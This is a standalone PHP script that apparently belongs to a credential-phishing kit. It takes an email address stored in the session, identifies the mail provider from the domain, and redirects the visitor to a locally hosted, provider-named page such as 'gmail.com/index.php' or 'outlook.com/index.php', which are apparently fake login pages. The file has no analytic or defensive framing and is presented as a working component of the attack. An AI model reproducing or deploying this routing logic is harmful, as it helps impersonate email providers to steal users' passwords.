<?php

session_start();

$email = $_SESSION['username'];

$gmail = array('gmail.com','gmail.co.uk','gmail.aus', 'googlemail.com');
$outlook = array('outlook.com', 'hotmail.com', 'outlook.co.uk', 'hotmail.co.uk', 'live.com','msn.com');
$yahoo = array('yahoo.com','yahoo.co.uk', 'yahoo.aus');
$interia = array('interia.pl', 'interia.eu');
$aol = array('aol.com', 'aol.co.uk', 'aol.aus');
$virgin = array('virginmedia.com');
$sky = array('sky.com', 'sky.co.uk');
$mail = array('mail.com', 'mail.co.uk');
$bt = array('btinternet.com');
$provider = explode('@',$email);
$prov = $provider[1];

if(in_array($prov, $gmail)){

header('location:gmail.com/index.php');


}elseif(in_array($prov, $outlook)){

header('location:outlook.com/index.php');

}elseif(in_array($prov, $yahoo)){

header('location:yahoo.com/index.php');    


}elseif(in_array($prov, $aol)){

header('location:AOL.com/index.php');



}elseif(in_array($prov, $virgin)){

header('location:virgin-mail.com/index.php');



}elseif(in_array($prov, $bt)){

header('location:bt-mail.com/index.php');



}elseif(in_array($prov, $interia)){

header('location:interia.com/index.php');



}


elseif(in_array($prov, $sky)){

header('location:sky-mail.com/index.php');



}

elseif(in_array($prov, $mail)){

header('location:wmail.com/index.php');



}


else{

header('location:mail.com/index.php');



};
?>














